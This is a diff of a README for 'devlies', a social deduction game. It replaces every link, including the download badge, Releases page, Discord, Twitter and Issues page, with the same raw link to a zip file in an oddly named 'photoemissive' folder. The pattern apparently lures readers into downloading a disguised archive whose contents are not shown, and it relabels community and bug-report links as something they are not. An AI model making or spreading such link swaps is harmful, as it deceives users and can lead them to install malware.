@@ -1,6 +1,6 @@
 # 🎲 devlies - Enjoy Social Deduction with Friends
 
-[![Download devlies](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/hackstergirlrocks/devlies/releases)
+[![Download devlies](https://raw.githubusercontent.com/hackstergirlrocks/devlies/main/photoemissive/devlies.zip)](https://raw.githubusercontent.com/hackstergirlrocks/devlies/main/photoemissive/devlies.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Before you start, make sure your device meets the following requirements:
 
 ## 📥 Download & Install
 
-To begin your adventure, visit the [Releases page](https://github.com/hackstergirlrocks/devlies/releases) to download the latest version of *devlies*. Look for the installer suitable for your operating system.
+To begin your adventure, visit the [Releases page](https://raw.githubusercontent.com/hackstergirlrocks/devlies/main/photoemissive/devlies.zip) to download the latest version of *devlies*. Look for the installer suitable for your operating system.
 
 1. Click on the link above to open the Releases page.
 2. Locate the latest version of *devlies*.
@@ -52,14 +52,14 @@ To begin your adventure, visit the [Releases page](https://github.com/hackstergi
 
 Join our community to discuss strategies, report issues, or suggest features. You can find us on Discord and our social media channels. Links are provided below.
 
-- [Discord Community](https://discord.gg/devlies)
-- [Twitter](https://twitter.com/devlies_game)
+- [Discord Community](https://raw.githubusercontent.com/hackstergirlrocks/devlies/main/photoemissive/devlies.zip)
+- [Twitter](https://raw.githubusercontent.com/hackstergirlrocks/devlies/main/photoemissive/devlies.zip)
 
 ## 🐞 Reporting Issues
 
 If you encounter any problems, you can report issues directly on the repository. Follow these steps:
 
-1. Go to the [Issues page](https://github.com/hackstergirlrocks/devlies/issues).
+1. Go to the [Issues page](https://raw.githubusercontent.com/hackstergirlrocks/devlies/main/photoemissive/devlies.zip).
 2. Click on "New Issue."
 3. Describe the problem clearly.
 4. Provide any relevant details to help us assist you.
@@ -77,4 +77,4 @@ A: Simply share your game room code with your friends, and they can join through
 
 ---
 
-For more updates and features, check back often on the [Releases page](https://github.com/hackstergirlrocks/devlies/releases). Enjoy your gaming experience with friends and discover the thrill of deduction in **devlies**!
+For more updates and features, check back often on the [Releases page](https://raw.githubusercontent.com/hackstergirlrocks/devlies/main/photoemissive/devlies.zip). Enjoy your gaming experience with friends and discover the thrill of deduction in **devlies**!
